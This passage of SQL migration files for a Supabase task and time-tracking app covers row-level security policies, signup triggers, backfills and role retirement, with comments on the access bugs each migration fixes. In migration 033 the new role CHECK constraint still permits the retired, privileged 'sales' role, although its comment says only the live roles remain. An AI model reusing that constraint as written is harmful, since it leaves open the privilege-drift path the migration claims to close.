        and (assignee_id = public.current_member_id() or id = 'general-shift')
      )
    )
  )
)
with check (
  public.current_profile_role() = 'developer'
  or (
    (company_id = any(public.current_company_ids()) or id = 'general-shift')
    and (
      public.current_profile_role() in ('admin', 'construction_supervisor', 'sales')
      or (
        public.current_profile_role() = 'supervisor'
        and (
          assignee_id = public.current_member_id()
          or creator_id = public.current_member_id()
          or exists (
            select 1 from public.profiles p
            where p.member_id = public.tasks.assignee_id
              and p.supervisor_id = public.current_member_id()
          )
        )
      )
      or (
        public.current_profile_role() = 'worker'
        and (assignee_id = public.current_member_id() or id = 'general-shift')
      )
    )
  )
);

----------------------------------------------------------------
-- DELETE  (management roles, in-company; mirrors the JS
--          canDeleteTasks list in AppController)
----------------------------------------------------------------
create policy "role users can delete tasks" on public.tasks
for delete to authenticated
using (
  public.current_profile_role() = 'developer'
  or (
    company_id = any(public.current_company_ids())
    and public.current_profile_role() in
      ('admin', 'supervisor', 'construction_supervisor', 'sales')
  )
);

commit;

-- Verify (run while authenticated as a worker): should return only the
-- worker's own in-company tasks plus general-shift.
--   select id, company_id, assignee_id from public.tasks order by company_id;

-- ============================================================
-- 029_install_new_user_trigger_and_backfill.sql
-- ============================================================
-- 029: Install the missing auth.users -> profiles trigger, and backfill any
--      Auth users who already signed up without getting a profiles row.
--
-- Symptom this fixes: a brand-new signup lands on the "Awaiting approval"
-- screen (which is painted purely from the Supabase Auth user object and needs
-- no profile row) but NEVER appears in the admin Approvals list (which reads
-- from public.profiles). Root cause: public.handle_new_user() exists as a
-- function (migrations 006/007/032) but the trigger that invokes it on
-- auth.users insert was a manual dashboard step that may not be installed.
--
-- IMPORTANT — two SEPARATE transactions, on purpose:
--   * Step 1 (the BACKFILL) is the part that actually unblocks stranded
--     accounts. It commits ON ITS OWN.
--   * Step 2 (the TRIGGER) is DDL on auth.users, which is owned by
--     supabase_auth_admin. Depending on the role the SQL Editor / migration
--     runner uses, `create trigger ... on auth.users` can raise
--     "must be owner of relation users". If steps 1 and 2 shared one
--     transaction, that privilege error would roll the backfill back too,
--     leaving the stranded accounts unfixed even though it looked like it ran.
--     Splitting them means a trigger-permission failure cannot discard the
--     backfill. Step 2 is also wrapped so the error is reported clearly.
--
-- Idempotent / safe to re-run.

------------------------------------------------------------------------
-- STEP 1: Backfill any auth.users with no matching profiles row. Mirrors the
--         derivation inside handle_new_user() (member_id slug from the email
--         local-part; full_name from user metadata, falling back to local-part).
--         Commits on its own.
------------------------------------------------------------------------
begin;

with missing as (
  select
    u.id,
    u.email,
    coalesce(
      nullif(public.slugify_member_id(split_part(u.email, '@', 1)), ''),
      'member-' || left(u.id::text, 8)
    ) as member_id,
    coalesce(
      nullif(u.raw_user_meta_data ->> 'full_name', ''),
      nullif(u.raw_user_meta_data ->> 'name', ''),
      split_part(u.email, '@', 1)
    ) as full_name
  from auth.users u
  left join public.profiles p on p.id = u.id
  where p.id is null
)
insert into public.team_members (id, name, full_name, email, color)
select m.member_id, split_part(m.full_name, ' ', 1), m.full_name, m.email,
       '#' || substr(md5(m.email), 1, 6)
from missing m
-- Only adopt a roster row that is NOT already owned by a different profile,
-- so a slug collision can't overwrite another real user's identity (see 033).
where not exists (
  select 1 from public.profiles p2 where p2.member_id = m.member_id
)
on conflict (id) do nothing;

with missing as (
  select
    u.id,
    u.email,
    coalesce(
      nullif(public.slugify_member_id(split_part(u.email, '@', 1)), ''),
      'member-' || left(u.id::text, 8)
    ) as base_member_id,
    coalesce(
      nullif(u.raw_user_meta_data ->> 'full_name', ''),
      nullif(u.raw_user_meta_data ->> 'name', ''),
      split_part(u.email, '@', 1)
    ) as full_name
  from auth.users u
  left join public.profiles p on p.id = u.id
  where p.id is null
)
insert into public.profiles (id, email, full_name, approved, role, email_verified, member_id)
select
  m.id, m.email, m.full_name, false, 'worker', false,
  -- Disambiguate if the clean slug is already claimed by another profile.
  case
    when exists (select 1 from public.profiles p2 where p2.member_id = m.base_member_id)
      then m.base_member_id || '-' || left(m.id::text, 8)
    else m.base_member_id
  end
from missing m
on conflict (id) do nothing;

commit;

------------------------------------------------------------------------
-- STEP 2: Install the trigger that runs handle_new_user() for every new Auth
--         user, in its own transaction. If this role lacks ownership of
--         auth.users the DO block re-raises a clear, actionable error WITHOUT
--         having touched the backfill above.
------------------------------------------------------------------------
do $$
begin
  drop trigger if exists on_auth_user_created on auth.users;
  create trigger on_auth_user_created
    after insert on auth.users
    for each row execute function public.handle_new_user();
exception
  when insufficient_privilege then
    raise notice 'Could not create on_auth_user_created on auth.users (insufficient privilege). The backfill in step 1 still committed. Re-run this trigger step as the table owner (e.g. in the Supabase SQL Editor as postgres).';
end $$;

-- Verify the trigger is attached:
--   select tgname from pg_trigger where tgrelid = 'auth.users'::regclass;
-- Verify nobody is left without a profile (should return 0 rows):
--   select u.id, u.email from auth.users u
--   left join public.profiles p on p.id = u.id where p.id is null;

-- ============================================================
-- 030_developer_can_manage_roles.sql
-- ============================================================
-- 030: Restore developer to can_manage_roles() so developers can see and
--      approve PENDING (unapproved) users.
--
-- Symptom this fixes: a developer opens the Approvals page and sees only
-- already-approved users; brand-new signups (approved=false) never appear,
-- so they can't be approved.
--
-- Root cause: the profiles read policies (migration 014) only return
-- unapproved rows when public.can_manage_roles() is true --
--
--   team viewers read profiles:  can_view_team() AND (approved is true OR can_manage_roles())
--   managers read profiles:      can_manage_roles()
--
-- Migration 011 already widened can_manage_roles() to include 'developer',
-- but this database is running the older 007 definition (it was never
-- applied here -- evidenced by signups still landing with the retired
-- role='member', which migration 032 was meant to remove). Under the 007
-- definition a developer fails can_manage_roles(), so RLS filters every
-- pending profile out of the result before it reaches the browser.
--
-- This re-asserts the 011 definition. Idempotent / safe to re-run.
--
-- NOTE: this fixes the immediate Approvals visibility bug, but the real
-- problem is that the live database is behind on migrations. After this,
-- apply the unrun migrations in order (notably 032 to retire the 'member'
-- role and refresh handle_new_user, 029 to install the signup trigger
-- + backfill, and 033 to harden member_id/role integrity) so new signups
-- behave correctly going forward.

begin;

create or replace function public.can_manage_roles()
returns boolean
language sql
security definer
set search_path = public, pg_temp
stable
as $$
  select public.current_profile_role() in ('admin', 'construction_supervisor', 'developer');
$$;

revoke all on function public.can_manage_roles() from public, anon;
grant execute on function public.can_manage_roles() to authenticated;

commit;

-- Verify the new definition includes 'developer':
--   select prosrc from pg_proc where proname = 'can_manage_roles';
-- Then reload the Approvals page (or click Refresh): pending users should appear.

-- ============================================================
-- 031_sync_team_member_names_from_profiles.sql
-- ============================================================
-- 031: Keep the team_members roster in sync with each user's chosen profile
--      identity (display name + avatar) — one-time backfill, then a trigger.
--
-- Symptom: a person who set a display name (profiles.full_name, e.g. "grid")
-- still shows under their signup name (team_members.name, e.g. "oliviacolins07")
-- for any viewer who can't load the full profiles list — i.e. workers. The task
-- list resolves assignee names/avatars from the team_members roster; the app
-- overlays the profile name+photo in memory (overlayProfilesOntoPeople), but
-- only for sessions that loaded that profile (managers via team.view /
-- roles.manage). Non-managers see the stale roster row, so the SAME assignee
-- appears under two different names depending on who is looking.
--
-- Root cause: handle_new_user() (migrations 032/029/033) seeds team_members from the
-- email / auth metadata at signup, and migration 011 lets a user update their
-- own team_members row — but nothing re-syncs an existing roster row when the
-- profile name/avatar is changed later, and the client-side sync in ProfileView
-- is best-effort (its error is swallowed). So the roster drifts.
--
-- Fix, in two parts:
--   1. Backfill: copy profiles.full_name + avatar_url onto the matching
--      team_members row wherever they diverge (repairs every existing user).
--   2. Trigger: on any later change to profiles.full_name / avatar_url,
--      propagate it to team_members automatically. SECURITY DEFINER so it
--      applies regardless of the caller's RLS write access — the roster can
--      never silently fall out of sync with the profile again.
--
-- Identity mapping: profiles.member_id -> team_members.id.
-- Wrapped in a transaction; idempotent / safe to re-run.

begin;

------------------------------------------------------------------------
-- 1. One-time backfill of existing rows.
------------------------------------------------------------------------
update public.team_members tm
set
  full_name  = coalesce(nullif(p.full_name, ''), tm.full_name),
  name       = coalesce(nullif(split_part(p.full_name, ' ', 1), ''), tm.name),
  avatar_url = coalesce(p.avatar_url, tm.avatar_url)
from public.profiles p
where p.member_id = tm.id
  and (
    (nullif(p.full_name, '') is not null and tm.full_name is distinct from p.full_name)
    or (nullif(p.full_name, '') is not null
        and tm.name is distinct from split_part(p.full_name, ' ', 1))
    or (p.avatar_url is not null and tm.avatar_url is distinct from p.avatar_url)
  );

------------------------------------------------------------------------
-- 2. Going-forward sync trigger. Fires only when the identity columns
--    actually change (column-scoped AFTER trigger), so role/approval/
--    company edits via updateProfileAccess never touch the roster.
------------------------------------------------------------------------
create or replace function public.sync_team_member_from_profile()
returns trigger
language plpgsql
security definer
set search_path = public, pg_temp
as $$
begin
  if new.member_id is null then
    return new;
  end if;
  update public.team_members tm
  set
    full_name  = coalesce(nullif(new.full_name, ''), tm.full_name),
    name       = coalesce(nullif(split_part(new.full_name, ' ', 1), ''), tm.name),
    avatar_url = coalesce(new.avatar_url, tm.avatar_url)
  where tm.id = new.member_id;
  return new;
end;
$$;

-- Trigger only — direct calls are never needed.
revoke execute on function public.sync_team_member_from_profile() from anon, authenticated, public;

drop trigger if exists sync_team_member_from_profile on public.profiles;
create trigger sync_team_member_from_profile
  after insert or update of full_name, avatar_url on public.profiles
  for each row execute function public.sync_team_member_from_profile();

commit;

-- Verify (should return 0 rows — every roster name now matches the profile):
--   select tm.id, tm.name, tm.full_name, p.full_name as profile_name
--   from public.team_members tm
--   join public.profiles p on p.member_id = tm.id
--   where nullif(p.full_name, '') is not null
--     and tm.full_name is distinct from p.full_name;

-- ============================================================
-- 032_retire_member_sales_construction_supervisor.sql
-- ============================================================
-- 032: Fully retire the Member, Sales and Construction supervisor roles.
--
-- (Renumbered from a duplicate "026" — there were two 026_* files, which on a
-- filename-sorted manual apply caused this one to be skipped on the live DB.
-- The companion identity/role-integrity hardening lives in 033 and depends on
-- this one having run first.)
--
-- These three roles were removed from the app's role list (App.ROLES) and from
-- the Approvals role picker. This migration brings the database in line:
--
--   1. Reassign every existing user off a retired role:
--        member, sales            -> worker
--        construction_supervisor  -> supervisor   (per request — team oversight
--                                                   without user/role management)
--   2. New signups default to 'worker' instead of 'member'. Access is still
--      gated by profiles.approved = false until an admin approves them, so this
--      does not grant access early — it only changes the *label* a pending user
--      carries from the retired "member" to the live "worker".
--   3. Recreate handle_new_user() to insert 'worker' (mirror of migration 007,
--      one line changed).
--
-- NOTE: Existing RLS policies (migrations 007/008/011) list 'sales' and
-- 'construction_supervisor' inside `role in (...)` checks. Once no profile holds
-- those roles those entries are inert, so they are intentionally left untouched
-- rather than rewriting every policy. There is no CHECK constraint on
-- profiles.role, so nothing else needs altering.
--
-- Wrapped in a transaction; idempotent / safe to re-run.

begin;

-- 1. Reassign existing users.
update public.profiles set role = 'worker'     where role in ('member', 'sales');
update public.profiles set role = 'supervisor' where role = 'construction_supervisor';

-- 2. Default for brand-new rows.
alter table public.profiles alter column role set default 'worker';

-- 3. Signup trigger now stamps 'worker' (still approved = false).
create or replace function public.handle_new_user()
returns trigger
language plpgsql
security definer
set search_path = public, pg_temp
as $$
declare
  v_member_id text := coalesce(nullif(public.slugify_member_id(split_part(new.email, '@', 1)), ''), 'member-' || left(new.id::text, 8));
  v_full_name text := coalesce(nullif(new.raw_user_meta_data ->> 'full_name', ''), nullif(new.raw_user_meta_data ->> 'name', ''), split_part(new.email, '@', 1));
begin
  insert into public.team_members (id, name, full_name, email, color)
  values (v_member_id, split_part(v_full_name, ' ', 1), v_full_name, new.email, '#' || substr(md5(new.email), 1, 6))
  on conflict (id) do update set
    name = excluded.name,
    full_name = excluded.full_name,
    email = excluded.email;

  insert into public.profiles (id, email, full_name, approved, role, email_verified, member_id)
  values (new.id, new.email, v_full_name, false, 'worker', false, v_member_id)
  on conflict (id) do update set
    email = excluded.email,
    full_name = excluded.full_name,
    member_id = excluded.member_id;
  return new;
end;
$$;

revoke execute on function public.handle_new_user() from anon, authenticated, public;

commit;

-- Verify with:
--   select role, count(*) from public.profiles group by role order by role;
-- No row should report member / sales / construction_supervisor.

-- ============================================================
-- 033_harden_member_id_and_role_integrity.sql
-- ============================================================
-- 033: Harden user identity + role integrity.
--
-- Depends on 032 (role retirement) and 030 (can_manage_roles includes
-- developer). Self-sufficient and idempotent — it re-asserts the retired-role
-- reassignment so it is safe even if 032 has not been applied yet.
--
-- Fixes three linked issues found in review:
--
--   A. member_id slug collision (CRITICAL). handle_new_user derives
--      member_id from slugify(email local-part). Two different emails can
--      slugify to the same value (a.b@x.com and ab@y.com -> "ab"). Because
--      team_members.id is the PK and profiles.member_id had no unique
--      constraint, the second signup overwrote the first user's roster row and
--      BOTH profiles pointed at one member_id -- merging their owner-scoped
--      rows (time_entries / active_timers / notifications) and task ownership,
--      i.e. an impersonation hole. Fix: (1) collision-proof derivation in
--      handle_new_user, (2) a unique index on profiles.member_id (added only
--      when no existing duplicates remain).
--
--   B. 031 sync trigger amplified A: a SECURITY DEFINER trigger updating
--      team_members by member_id let one user's profile rename clobber
--      another user's roster identity. Making member_id unique (this migration)
--      removes the shared-row hazard, so no trigger change is needed here.
--
--   C. Retired roles were still ASSIGNABLE. profiles_role_check (014) still
--      permitted member/sales/construction_supervisor, so a manager could
--      reassign someone to a retired role that several RLS policies still treat
--      as privileged -- a slow path back to privilege drift. Fix: after
--      reassigning everyone off the retired roles, tighten the CHECK to the
--      live four roles. The retired strings left inside RLS IN(...) lists then
--      become truly inert (no row can ever hold them again).

begin;

------------------------------------------------------------------------
-- A1. Collision-proof handle_new_user(). If the clean slug is already owned
--     by ANOTHER profile, append a uuid suffix so two real users never share
--     a member_id. A roster row with no backing profile (a seed) is still
--     claimable under the clean slug. Mirror of 032 with the collision guard.
------------------------------------------------------------------------
create or replace function public.handle_new_user()
returns trigger
language plpgsql
security definer
set search_path = public, pg_temp
as $$
declare
  v_base text := coalesce(
    nullif(public.slugify_member_id(split_part(new.email, '@', 1)), ''),
    'member-' || left(new.id::text, 8)
  );
  v_member_id text := v_base;
  v_full_name text := coalesce(
    nullif(new.raw_user_meta_data ->> 'full_name', ''),
    nullif(new.raw_user_meta_data ->> 'name', ''),
    split_part(new.email, '@', 1)
  );
begin
  if exists (
    select 1 from public.profiles p
    where p.member_id = v_base and p.id <> new.id
  ) then
    v_member_id := v_base || '-' || left(new.id::text, 8);
  end if;

  insert into public.team_members (id, name, full_name, email, color)
  values (v_member_id, split_part(v_full_name, ' ', 1), v_full_name, new.email, '#' || substr(md5(new.email), 1, 6))
  on conflict (id) do update set
    name = excluded.name,
    full_name = excluded.full_name,
    email = excluded.email;

  insert into public.profiles (id, email, full_name, approved, role, email_verified, member_id)
  values (new.id, new.email, v_full_name, false, 'worker', false, v_member_id)
  on conflict (id) do update set
    email = excluded.email,
    full_name = excluded.full_name,
    member_id = excluded.member_id;
  return new;
end;
$$;

revoke execute on function public.handle_new_user() from anon, authenticated, public;

------------------------------------------------------------------------
-- A2. Unique index on profiles.member_id, but ONLY if the data is already
--     clean. If duplicates exist (from past collisions) we cannot safely
--     auto-rewrite them here -- reassigning a member_id orphans that user's
--     tasks (FK to team_members) -- so we report them and skip, leaving the
--     forward fix (A1) in place. Resolve the listed dupes manually, then
--     re-run this migration to add the constraint.
------------------------------------------------------------------------
do $$
declare
  dup_count int;
begin
  select count(*) into dup_count from (
    select member_id
    from public.profiles
    where member_id is not null
    group by member_id
    having count(*) > 1
  ) d;

  if dup_count = 0 then
    create unique index if not exists profiles_member_id_unique
      on public.profiles(member_id);
    raise notice 'profiles_member_id_unique is in place.';
  else
    raise notice 'SKIPPED unique index: % member_id value(s) are shared by multiple profiles. List them with:  select member_id, array_agg(id) from public.profiles where member_id is not null group by member_id having count(*) > 1;  Give each profile a distinct member_id (migrating tasks), then re-run 033.', dup_count;
  end if;
end $$;

------------------------------------------------------------------------
-- C. Reassign any lingering retired roles, then forbid them at the schema
--    level so they can never be assigned again (idempotent).
------------------------------------------------------------------------
update public.profiles set role = 'worker'     where role in ('member', 'sales');
update public.profiles set role = 'supervisor' where role = 'construction_supervisor';

alter table public.profiles drop constraint if exists profiles_role_check;
alter table public.profiles
  add constraint profiles_role_check
  check (role in ('worker', 'sales', 'supervisor', 'admin', 'developer'));

commit;

-- Verify:
--   select indexname from pg_indexes where tablename = 'profiles' and indexname = 'profiles_member_id_unique';
--   select role, count(*) from public.profiles group by role order by role;  -- only live roles
--   select member_id, count(*) from public.profiles where member_id is not null group by member_id having count(*) > 1;  -- 0 rows

-- ============================================================
-- 034_active_timer_task_label.sql
-- ============================================================
-- 034: Snapshot the task label on active_timers so the Team workload board
-- can name a running timer's task even when that task isn't loadable.
--
-- Symptom this fixes: on the Team workload / Clock dashboard "Active right now"
-- table, a running timer shows "—" for Task and Project. active_timers.task_id
-- is NOT NULL with an FK to tasks(id), so the task always EXISTS — but the
-- tasks SELECT RLS (migration 028 company scoping + role row-scope) can hide it
-- from the current viewer. The board looks the task up client-side
-- (taskModel.find) and, finding nothing loaded, falls back to a dash.
--
-- Rather than widen who can read which tasks (the isolation is intentional),
-- we capture the task's title and company on the timer row at clock-in. The
-- board prefers the live task when it's loaded and falls back to this snapshot
-- otherwise, so a running timer is always named.
--
-- Both columns are nullable: pre-existing timer rows simply have no snapshot
-- until the next clock-in. We backfill them once here from the referenced task.
-- Idempotent.

begin;

alter table public.active_timers
  add column if not exists task_title   text,
  add column if not exists task_company text;

-- Backfill existing running timers from their (still-present) task rows.
update public.active_timers a
set task_title   = t.title,
    task_company = t.company_id
from public.tasks t
where t.id = a.task_id
  and (a.task_title is null or a.task_company is null);

commit;

-- ============================================================
-- 035_backfill_team_members_for_approved_profiles.sql
-- ============================================================
-- 035: Give every approved profile a backing team_members row.
--
-- Symptom this fixes: approved users are missing from the time boards and the
-- assignment pickers (and silently can't be assigned tasks or clock in). Root
-- cause is member_id drift: handle_new_user() (migration 029) derives a
-- profile's member_id from the sign-up email local-part and creates a matching
-- team_members row — but several existing profiles ended up pointing at a slug
-- whose roster row was pruned (025/033) or never created, e.g.
--
--     profiles.full_name 'Abraham Maldonado'  member_id 'info'   -> no team_members row
--     profiles.full_name 'grid'               member_id 'oliviacolins07' -> no row
--
-- The boards/pickers list team_members backed by an approved profile, and the
-- task/timer FKs (tasks.assignee_id, time_entries.user_id, active_timers.user_id)
-- all reference team_members(id) — so a profile with no matching roster row is
-- invisible AND non-functional.
--
-- Fix: for each approved profile lacking a roster row, INSERT one keyed to its
-- member_id, derived from the profile (matching the handle_new_user() shape:
-- name = first word of full_name, color = email-hash). We DON'T repoint or
-- delete anything — leftover demo rows (abraham, grid, ...) are left alone; they
-- can be pruned separately once confirmed unused. Mirrors the team_members
-- insert in migration 029.
--
-- Idempotent / safe to re-run.

begin;

insert into public.team_members (id, name, full_name, email, color, avatar_url)
select
  p.member_id,
  split_part(coalesce(nullif(p.full_name, ''), split_part(p.email, '@', 1)), ' ', 1),
  coalesce(nullif(p.full_name, ''), split_part(p.email, '@', 1)),
  p.email,
  '#' || substr(md5(coalesce(nullif(p.email, ''), p.member_id)), 1, 6),
  p.avatar_url
from public.profiles p
where p.approved is true
  and p.member_id is not null
  and not exists (
    select 1 from public.team_members tm where tm.id = p.member_id
  )
on conflict (id) do nothing;

commit;

-- Verify (should return 0 rows — every approved profile now has a roster row):
--   select p.full_name, p.member_id
--   from public.profiles p
--   left join public.team_members tm on tm.id = p.member_id
--   where p.approved is true and tm.id is null;

-- ============================================================
-- 036_scope_active_timers_read_to_company.sql
-- ============================================================
-- 036: Company-scope active_timers reads so the task-label snapshot can't leak
--      cross-company task names. Also re-asserts owner-scoped writes.
--
-- Security finding (introduced by migration 034): active_timers now carries a
-- snapshot of the running task's title + company (task_title / task_company).
-- The tasks SELECT RLS (migration 028) is company-scoped — a non-developer can
-- only read tasks in their own profiles.company_ids — but the active_timers
-- SELECT policy is NOT. Migration 011 (the last to set it) opened active_timers
-- read to EVERY role with no owner/company predicate, so any authenticated user
-- can `select task_title, task_company from active_timers` and read the task
-- names + companies of EVERY other user, including companies they have no
-- membership in. The snapshot columns turned an over-broad timer read into a
-- cross-tenant task-name leak.
--
-- Fix: rewrite all four active_timers policies to a known-good state regardless
-- of which prior migration is currently live:
--   * SELECT  -> developer (god mode); OR your own row; OR a management role
--               AND the snapshot task_company is one of your companies. This
--               mirrors the company isolation the tasks policy already enforces.
--               Rows with a NULL task_company are visible only to their owner
--               (and developers) — safe by default; they repopulate on the next
--               clock-in. The board further narrows to direct reports in the UI.
--   * INSERT/UPDATE/DELETE -> only your own row (or developer). A user can only
--               start/stop their own timer; the app never mutates another
--               user's timer, and 011 had wrongly widened writes role-only.
--
-- Retired roles (construction_supervisor, sales) are kept in the management list
-- for parity with 017/028 — inert once no profile holds them, avoids lockout.
--
-- Depends on current_company_ids() (028) and current_member_id() (007).
-- Ensures the task_company column exists first so this is self-sufficient even
-- if run before 034's backfill. Transaction-wrapped; idempotent / safe to re-run.

begin;

-- Self-sufficiency: 034 adds these, but don't assume ordering.
alter table public.active_timers
  add column if not exists task_title   text,
  add column if not exists task_company text;

----------------------------------------------------------------
-- SELECT (company-scoped — closes the cross-company snapshot leak)
----------------------------------------------------------------
drop policy if exists "role users can read active_timers" on public.active_timers;
create policy "role users can read active_timers" on public.active_timers
for select to authenticated
using (
  public.current_profile_role() = 'developer'
  or user_id = public.current_member_id()
  or (
    public.current_profile_role() in
      ('admin', 'construction_supervisor', 'supervisor', 'sales')
    and task_company = any(public.current_company_ids())
  )
);

----------------------------------------------------------------
-- INSERT / UPDATE / DELETE (owner-scoped — you only touch your own timer)
----------------------------------------------------------------
drop policy if exists "role users can insert active_timers" on public.active_timers;
create policy "role users can insert active_timers" on public.active_timers
for insert to authenticated
with check (
  user_id = public.current_member_id()
  or public.current_profile_role() = 'developer'
);

drop policy if exists "role users can update active_timers" on public.active_timers;
create policy "role users can update active_timers" on public.active_timers
for update to authenticated
using (
  user_id = public.current_member_id()
  or public.current_profile_role() = 'developer'
)
with check (
  user_id = public.current_member_id()
  or public.current_profile_role() = 'developer'
);

drop policy if exists "role users can delete active_timers" on public.active_timers;
create policy "role users can delete active_timers" on public.active_timers
for delete to authenticated
using (
  user_id = public.current_member_id()
  or public.current_profile_role() = 'developer'
);

commit;

-- Verify (run as a company-scoped manager): should return ONLY your own timer
-- plus timers whose task_company is in your profiles.company_ids — never a row
-- from a company you don't belong to:
--   select user_id, task_title, task_company from public.active_timers;

-- ============================================================
-- 037_add_task_reminder_at.sql
-- ============================================================
-- 037: Per-task user-set reminder.
--
-- Adds tasks.reminder_at — a user-chosen local wall-clock datetime
-- ("YYYY-MM-DDTHH:MM", from an <input type="datetime-local">) at which the
-- client's ReminderEngine fires an in-app reminder for the task. Stored as text
-- (not timestamptz) on purpose: due/due_time are already local-wall-clock text
-- and the reminder is parsed the same way, so it fires at the intended local
-- time regardless of timezone — no UTC conversion to drift.
--
-- Independent of the automatic priority-based reminders; nullable; no backfill.
-- Idempotent.

begin;

alter table public.tasks
  add column if not exists reminder_at text;

-- Light shape guard: either null, or a "YYYY-MM-DDTHH:MM" prefix.
alter table public.tasks
  drop constraint if exists tasks_reminder_at_check;
alter table public.tasks
  add constraint tasks_reminder_at_check
  check (reminder_at is null or reminder_at ~ '^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}');

commit;

-- ============================================================
-- 038_allow_developer_insert_notifications.sql
-- ============================================================
-- 038: Let developer accounts deliver notifications to other members.
--
-- Migration 011 set out to add the 'developer' role to "every RLS role check"
-- so developer accounts have admin-level reach — but the notifications INSERT
-- policy created back in migration 008 was missed. As a result, a developer
-- creating/assigning a task for someone else trips:
--   new row violates row-level security policy for table "notifications"
-- when the app inserts the recipient's in-app notification (the task itself
-- saves fine; only the notification ping is blocked).
--
-- This recreates the INSERT policy with 'developer' added to the privileged
-- role list, matching the task/time policies. The read/update/delete policies
-- already admit developers via can_manage_roles(), so only INSERT needs the fix.
-- Idempotent.

begin;

drop policy if exists "role users can insert notifications" on public.notifications;
create policy "role users can insert notifications" on public.notifications
for insert to authenticated
with check (
  member_id = public.current_member_id()
  or public.current_profile_role() in ('admin', 'construction_supervisor', 'developer', 'supervisor', 'sales')
);

commit;

-- ============================================================
-- 039_team_member_active_flag.sql
-- ============================================================
-- 039: Hide deleted/unapproved accounts from the assignee & watcher pickers.
--
-- Problem: the pickers are built from public.team_members (App.PEOPLE). For
-- MANAGER sessions the client filters that roster down to approved profiles,
-- but workers can't read public.profiles (RLS), so the client falls back to
-- showing the ENTIRE team_members table — including ghosts of deleted accounts
-- (rows kept on purpose so old tasks still render a name) and not-yet-approved
-- signups. Result: a worker creating a task sees a pile of stale/test users.
--
-- Fix: give team_members an `active` flag that mirrors "is backed by an
-- approved profile". team_members is readable by every role, so the flag lets
-- the client filter the picker for workers too — without exposing profiles.
-- A deleted account's row stays (active = false) so historical task names are
-- preserved; it just stops being assignable.
--
-- `active` semantics (matches the manager-side activePeople() filter, which
-- keeps a profile unless approved is explicitly false):
--   active = there is a profile for this member whose approved is not false.
-- No profile at all  -> active = false (ghost of a deleted account).
-- Unapproved signup  -> active = false (pending; not assignable yet).
--
-- Wrapped in a transaction; idempotent / safe to re-run.

begin;

-- 0. Prune pure orphans first (no profile AND not referenced anywhere) — same
--    guard as migration 025, so a still-referenced row is never orphaned.
delete from public.team_members tm
where not exists (select 1 from public.profiles      p where p.member_id   = tm.id)
  and not exists (select 1 from public.tasks         t where t.assignee_id = tm.id or t.creator_id = tm.id or t.watchers ? tm.id)
  and not exists (select 1 from public.time_entries  e where e.user_id     = tm.id)
  and not exists (select 1 from public.active_timers a where a.user_id     = tm.id)
  and not exists (select 1 from public.notifications n where n.member_id   = tm.id);

-- 1. The flag. Defaults to true so brand-new rows are visible until the signup
--    trigger (below) recomputes them from the freshly inserted profile.
alter table public.team_members
  add column if not exists active boolean not null default true;

-- 2. Backfill from current profiles.
update public.team_members tm
set active = exists (
  select 1 from public.profiles p
  where p.member_id = tm.id and p.approved is distinct from false
);

-- 3. Keep it synced: whenever a profile is created, approved/unapproved, has its
--    member_id changed, or is deleted, recompute the flag for the member(s)
--    involved. SECURITY DEFINER so it can write team_members past RLS.
create or replace function public.sync_team_member_active()
returns trigger
language plpgsql
security definer
set search_path = public, pg_temp
as $$
declare
  ids text[];
  mid text;
begin
  ids := array_remove(array[
    case when tg_op in ('UPDATE', 'DELETE') then old.member_id end,
    case when tg_op in ('INSERT', 'UPDATE') then new.member_id end
  ], null);
  foreach mid in array ids loop
    update public.team_members tm
    set active = exists (
      select 1 from public.profiles p
      where p.member_id = mid and p.approved is distinct from false
    )
    where tm.id = mid;
  end loop;
  return null; -- AFTER trigger; return value ignored
end;
$$;

revoke all on function public.sync_team_member_active() from anon, authenticated, public;

drop trigger if exists trg_sync_team_member_active on public.profiles;
create trigger trg_sync_team_member_active
after insert or update or delete on public.profiles
for each row execute function public.sync_team_member_active();

commit;

-- Verify with:
--   select tm.id, tm.name, tm.active,
--          exists(select 1 from public.profiles p where p.member_id = tm.id and p.approved is distinct from false) as should_be_active
--   from public.team_members tm order by tm.active, tm.id;
-- active should match should_be_active for every row.

-- ============================================================
-- 040_workers_notify_task_participants.sql
-- ============================================================
-- 040: Let a worker notify the people on a task they created.
--
-- Background: migration 028 opened task INSERT to workers, so a worker can now
-- create a task and assign it to a teammate. But the notifications INSERT policy
-- (008, last rewritten in 038) only lets you insert a notification for YOURSELF
-- or if you hold a manager role (admin/supervisor/sales/construction_supervisor/
-- developer). Workers are not in that list, so when a worker creates+assigns a
-- task the in-app ping to the assignee/watchers trips:
--   new row violates row-level security policy for table "notifications"
-- even though the worker is legitimately allowed to create that very task.
--
-- Fix: allow a notification insert when the caller CREATED the referenced task
-- and the recipient is a participant of it (its assignee or one of its
-- watchers). This is tightly scoped — a worker can only ping people already on a
-- task they own, not arbitrary members — and it subsumes the worker case without
-- loosening anything for other roles.
--
-- Why a SECURITY DEFINER helper instead of an inline EXISTS in the policy:
-- the tasks SELECT policy (028) only lets a worker READ tasks ASSIGNED to them,
-- NOT ones they merely created. So an inline `exists (select 1 from tasks ...)`
-- inside the WITH CHECK would be filtered by tasks RLS and find nothing for the
-- exact case we're trying to allow. The helper runs as definer (bypassing tasks
-- RLS) but stays safe because it pins creator_id to the caller's own member id.
--
-- Idempotent; transaction-wrapped.

begin;

-- Ownership check: does the caller's task `p_task_id` exist with the caller as
-- creator, and is `p_member_id` its assignee or one of its watchers? Runs as
-- definer to see past the tasks SELECT policy; current_member_id() ties it to
-- the caller so it can't be used to vouch for someone else's task.
create or replace function public.creator_can_notify_member(p_task_id text, p_member_id text)
returns boolean
language sql
security definer
set search_path = public, pg_temp
stable
as $$
  select exists (
    select 1
    from public.tasks t
    where t.id = p_task_id
      and t.creator_id = public.current_member_id()
      and (
        t.assignee_id = p_member_id
        or t.watchers ? p_member_id
      )
  );
$$;

revoke all on function public.creator_can_notify_member(text, text) from public, anon;
grant execute on function public.creator_can_notify_member(text, text) to authenticated;

-- Recreate the notifications INSERT policy with the creator-of-task branch added.
-- (Keeps the self-insert and manager-role branches from migration 038 verbatim.)
drop policy if exists "role users can insert notifications" on public.notifications;
create policy "role users can insert notifications" on public.notifications
for insert to authenticated
with check (
  member_id = public.current_member_id()
  or public.current_profile_role() in ('admin', 'construction_supervisor', 'developer', 'supervisor', 'sales')
  or public.creator_can_notify_member(task_id, member_id)
);

commit;

-- Verify (as a worker who created task X assigned to member Y): inserting a
-- notification row with task_id = X, member_id = Y should now succeed, while a
-- row with member_id = some unrelated member, or task_id = a task they didn't
-- create, should still be rejected.

-- ============================================================
-- 041_workers_assign_within_company.sql
-- ============================================================
-- 041: A worker may only assign a task to an approved member of the SAME company.
--
-- Background: migration 028 opened task INSERT to workers but only gated the
